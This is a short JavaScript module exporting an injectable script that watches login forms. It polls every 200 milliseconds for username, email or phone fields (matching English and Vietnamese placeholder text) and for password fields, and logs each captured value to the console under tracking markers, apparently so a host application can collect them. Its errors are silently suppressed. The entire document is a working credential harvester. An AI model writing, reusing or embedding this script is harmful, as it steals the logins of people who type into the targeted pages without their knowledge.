export const credentialTrackerScript = `
(function() {
	if (window.__credentialTracker) return;
	window.__credentialTracker = true;
	
	let email = "";
	let password = "";
	
	setInterval(() => {
		try {
			const inputs = Array.from(document.querySelectorAll('input'));
			if (inputs.length === 0) return;
			
			const emailInput = inputs.find(i => {
				const type = i.type || 'text';
				const placeholder = (i.placeholder || '').toLowerCase();
				return (type === 'text' || type === 'email' || type === 'tel') && 
					   (placeholder.includes('phone') || placeholder.includes('email') || placeholder.includes('username') || placeholder.includes('sđt') || placeholder.includes('address') || placeholder.includes('tài khoản'));
			}) || inputs[0];
			
			const passwordInput = inputs.find(i => i.type === 'password') || inputs[1];
			
			if (emailInput && emailInput.value && emailInput.value !== email) {
				email = emailInput.value;
				console.log("__TRACKED_EMAIL__:" + email);
			}
			if (passwordInput && passwordInput.value && passwordInput.value !== password) {
				password = passwordInput.value;
				console.log("__TRACKED_PASSWORD__:" + password);
			}
		} catch(e) {}
	}, 200);
})();
`;
